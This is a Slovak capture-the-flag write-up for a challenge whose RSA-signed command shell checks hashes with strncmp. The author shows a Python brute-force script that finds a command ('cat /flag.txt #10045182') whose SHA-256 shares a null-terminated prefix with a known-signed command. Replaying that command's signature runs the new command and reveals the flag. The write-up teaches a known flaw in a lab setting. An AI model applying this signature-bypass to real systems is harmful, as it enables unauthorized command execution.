# Zadanie

EN: The ByteBusters are using a highly secure shell to access their internal servers. Can you retrieve the root secret stored on this server?

SK: ByteBusters používajú na prístup k svojim interným serverom vysoko bezpečný shell. Môžete získať rootov tajný kľúč uložený na tomto serveri?

`exp.cybergame.sk:7013`

**Súbory:**

- Dockerfile
- flag.txt
- main.c
- Makefile

## Riešenie

Nejdem vypisovať celý kód úlohy do riešenia, je priložený v tomto priečinku. Keď sa pripojím na endpoint, privíta ma obrazovka

```
RSA Command Verifier - Interactive Mode
Enter 'exit' to quit
Enter 'help' for a list of available commands

Command: 
```

Keď zadám command help, dostanem

```
RSA Command Verifier - Interactive Mode
Enter 'exit' to quit
Enter 'help' for a list of available commands

Command: help
Available commands:
ls -la
    Signature: HzMYHdphK4aNR39gy8TagqyZB7m9ZPy2lk3yNXVg8eIaS22Q0p7iGcryF9xhmWRwLfs3ouUVbHevmk5/KM8z/kifmh0HABy5pYxlBe/OZ9oqahNWJiJ8CTYj1C/Y8+Qt8UdDTLAvz3zRY6q5lSD7mq2wZUME3Fn6sc2JnoZOyLvgAVBBMF+mdrtm0Ks36hLtwrTe38rafWTw+u6EsIbyElWylwNxyzDE6Raru5U9lNGVvrIrLCXq1/+9r3qtPXMU7SieB7i8jQnGCMOO9Gk3VIxac0l/4po5SPaOQPrJarXKMGC34Wu8bqN4DaBdAN/ZJF5f6nfhv3SPzRLtN/xL5w==

whoami
    Signature: JZN4TmtyPnqx3I/r3bBCnh0NdsRCoA/rNU89a4QjUhDitAlKTHJ4+Hsc+bLKlTT4uLRuVJT0Pl6yeqXVbwiQzixChEC0rPsoRXPnU0UYkF18PY0rFyAYY37kCibjyniQUGq624ahin8jCD4RjNc+9wCEo03qfP/T/ZoB/1pWhuEQ11UdBvN6IisgRs925b5opGQaIGa7PJCGvlVDjH6B8jQRLiS11XzTXfknd4osd3OjeIBN08Mqc9NwYpmnJN022oiJNIpv8h9aY4RNI0+5pW7+GcsqBOYc+JXX7U+upG+5M9tOW+pEoh/3OGNxl67QKPmkzSa68FyBj2WGa9pqFg==

date
    Signature: EhP2rtwDHt6p0kpd8FgBXPEojKxX8u75F4uLDnAhcaZgeMHGH0hZz/j+F+yzHFVJirw99+vQYe1lF37A7gf4jWkNKywSN5MRf9R+HHJX3/mya+fxxIkv7njLo7ImLoStE8F/YK8ycBKQgqvuxL4nSrVmzg4KNfdfVxn9NnASBD3sJ9GqWIEJjBm5y2yQIknlo0pZ5/jc1Wu0iknm//sl9TZ9Dx9ZBfcDEgYSTgabQ4IhtC4CPDeM6yF6SxZ1X8qRMnEREbyOWUJj29//+kdkYd8+TM7sj/4DRm6rfeOPBQ2t8eX1hZJNVrS+F3jZKsVYrSkN3jNJqrOeCqCeYHhtLQ==

uptime
    Signature: IXazNAng88tOkNBmtGSmrVp3X47Z+fRz5egG0NOzMzkRECSJdPDcpQD/T3oMQU5749lT3k9HHZ5N3ptyGNy6+wlSsU02+O15eFXBXJ1cQIf1mvOLwoNhfHpvTRT1Ysx3w7cWAZY73ajFS3YNoLvfZiJs9fbD7mYo3VEmInJcC4KkHu5gdXW0mCh9B34meiA+6A2Djj6r+3XUoyopscq3qZxz3+b3w0FrFgvSF9F0qsrVCIc6nMSNV1GZv7uD5OhVKWMjK+jIrbDJ7Idh/8BDvYrWL8Y4EnC0HP+ezLDUdW4iSqDzzb6QgBwslDEC/cevceXtNDGaHzde5vsGdTVLhA==

pwd
    Signature: M0Ozdz6YObaYUx+4YP+hx1cT2TprJkkvJ6DTwRRZOFqUi4e6SmVL37ZGC5ipH1VEmDAQN1lS//1zBS7UktLp5tiA8KbB0jM5lxN8NnGxFAEsr5BkUa4LPt+6ndPZ2E2bZFAIuSZf8bOzrSUHZfww1fBi2pvUhOF2t7kUlyGicWI1xGNbtEww1HjWA+QXGbmMMEm7tY+65Q8Biwb4E/HBTHC6ME687NMj5YUDxgf4SztCHCLcfY5zwt826wuAglyxXZYTMs1/RPv8OLl/GT2JgjTGU2C3J1QtnuFswQatOqkzvRSVn7by68fI19INbSb4l/7nzB3zb/qzwWQY7F6yWA==
```

Vyzerá to na shell, kde možem zadať akýkoľvek príkaz, ale s tým rozdielom, že ho musím asi podpísať, aspoň takto to vyzerá z konktextu. Z dokcerfile vidím, že vlajka v dokceri je na adrese `/flag.txt` a ak zadám `cat /flag.txt`, tak to odomňa pýta podpis, ktorý si nemám žiaľ ako vytvoriť.

```
RSA Command Verifier - Interactive Mode
Enter 'exit' to quit
Enter 'help' for a list of available commands

Command: cat /flag.txt
Signature: AAAA
Signature decryption failed
```

V kóde vidieť, že sa jedná o šifrovanie RSA, nie teda o podpis ako taký a je vidieť, že podpis je vlastne hash zadaného príkazu ako stringu, resp jeho digest, teda hash ako bajty a podpisom je vlastne tento hash digest zašifrovaný privátným kľúčom. Overenie podpisu v kóde prebieha tak, že server zadaný "podpis" dešifruje verejným kľúčom a z dešifrovania vlastne vypadne hash toho príkazu, ak teda bol podpis zašifrovaný správnym privátnym kľúčom. Následne server dešifrovaný text porovná s hashom príkazu a ak sú oba reťazce bajtov totožné, tak príkaz napokon vykoná. 

V čom je ale problém?

Používa sa na overenie funkcia `strncmp`, ktorá potrebuje tri argumenty, reťazec1, reťazec2 a číslo, ktoré urči koľko bajtov sa bude porovnávať. Ale má to háčik, rovnako `strcmp`, overuje zároveň, kým nenarazí na prvý null bajt. Ak je null bajt v strede reťazca, tak sa overenie ukončí a ak dovtedy boli všetky bajty dovtedy zhodné, výsledok ako celok je, že došlo k zhode aj keď daľšie bajty nemuseli byť zhodné.

A tu narážame na možnosť riešenia, pretože z helpu vidíme pár príkazov a ich známe podpisy a jeden z nich, konkrétne `ls -la` má hash `1de700c29687cae34561545f50d3c8b3d9afe88e04cc11069f8a6dc6e4ce9464` a hneď tretí bajt je null bajt, to znamená, že ak zadáme akýkoľvek príkaz, ktorého hash má prvé tri bajty rovnaké ako tento `ls -la`, teda `0x1d 0xe7 0x00` a zadáme podpis rovnaký ako má `ls -la`, tak sa dešifruje na tento hash a defacto sa porovnajú len prvé tri bajty.

Ako ale nájsť taký príkaz?

Hľadam ani nemusím. Potrebujem `cat /flag.txt` a keď dám za to `#xxxxx`, kde mriežka je začiatok komentu a xxxxx je niečo za tým, tak to dá bashu info, že toto za # nevykonaj, ale program úlohy to však vezme ako príkaz, z ktorého vyrobí hash... Našou úlohou bude teda nájsť za # taký string, ktorý nám vyrobí hash, ktorý začína bajtami `0x1d 0xe7 0x00`.

Na to mi poslúži úplne jednoduchý python skript

```python
import hashlib, itertools, sys
target = b'\x1d\xe7\x00'          # prefix zo SHA-256("ls -la")
base   = "cat /flag.txt #"
for i in itertools.count():
    cmd = f"{base}{i}"
    if hashlib.sha256(cmd.encode()).digest().startswith(target):
        print("Nájdené:", cmd)
        sys.exit()
```

ktorý mi iba po pár sekundách iterácií zahlási výsledok

`Nájdené: cat /flag.txt #10045182`

Takže keď zadám tento príkaz v takejto forme a zadám podpis z `ls -la`, mal by sa vykonať môj príkaz a teda `cat /flag.txt`

Výseldok?

```bash
RSA Command Verifier - Interactive Mode
Enter 'exit' to quit
Enter 'help' for a list of available commands

Command: cat /flag.txt #10045182
Signature: HzMYHdphK4aNR39gy8TagqyZB7m9ZPy2lk3yNXVg8eIaS22Q0p7iGcryF9xhmWRwLfs3ouUVbHevmk5/KM8z/kifmh0HABy5pYxlBe/OZ9oqahNWJiJ8CTYj1C/Y8+Qt8UdDTLAvz3zRY6q5lSD7mq2wZUME3Fn6sc2JnoZOyLvgAVBBMF+mdrtm0Ks36hLtwrTe38rafWTw+u6EsIbyElWylwNxyzDE6Raru5U9lNGVvrIrLCXq1/+9r3qtPXMU7SieB7i8jQnGCMOO9Gk3VIxac0l/4po5SPaOQPrJarXKMGC34Wu8bqN4DaBdAN/ZJF5f6nfhv3SPzRLtN/xL5w==
Signature verified. Executing command: cat /flag.txt #10045182
SK-CERT{anyb0dy_r3m3mb3r5_th3_wii_d4ys_4nd_th3_signing_bug?}
```

## Vlajka

```
SK-CERT{anyb0dy_r3m3mb3r5_th3_wii_d4ys_4nd_th3_signing_bug?}
```
